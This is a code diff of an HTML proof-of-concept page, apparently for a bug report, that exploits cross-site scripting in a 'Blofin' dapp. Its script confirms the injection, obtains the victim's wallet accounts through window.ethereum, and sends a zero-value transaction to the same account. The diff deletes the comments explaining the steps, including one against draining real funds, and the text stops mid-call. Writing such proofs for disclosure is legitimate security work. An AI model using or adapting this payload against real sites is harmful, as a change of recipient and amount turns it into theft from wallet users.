@@ -2,16 +2,12 @@
 <html><head><meta charset="UTF-8"><title>CRITICAL XSS</title></head><body>
 <h1>BLOFIN DAPP XSS -> WALLET DRAIN</h1>
 <script>
-// 1. Buktikan XSS
 alert('XSS CONFIRMED: '+document.domain);
-
-// 2. Buktikan bisa akses provider dan minta akun (impact)
 async function pwn(){
   if(window.ethereum){
     try{
       const accs = await window.ethereum.request({method:'eth_requestAccounts'});
       alert('CRITICAL: Got accounts via XSS: '+accs[0]);
-      // 3. Proof bisa kirim tx 0 ETH ke diri sendiri (jangan drain beneran)
       await window.ethereum.request({
         method:'eth_sendTransaction',
         params:[{from:accs[0], to:accs[0], value:'0x0'}]
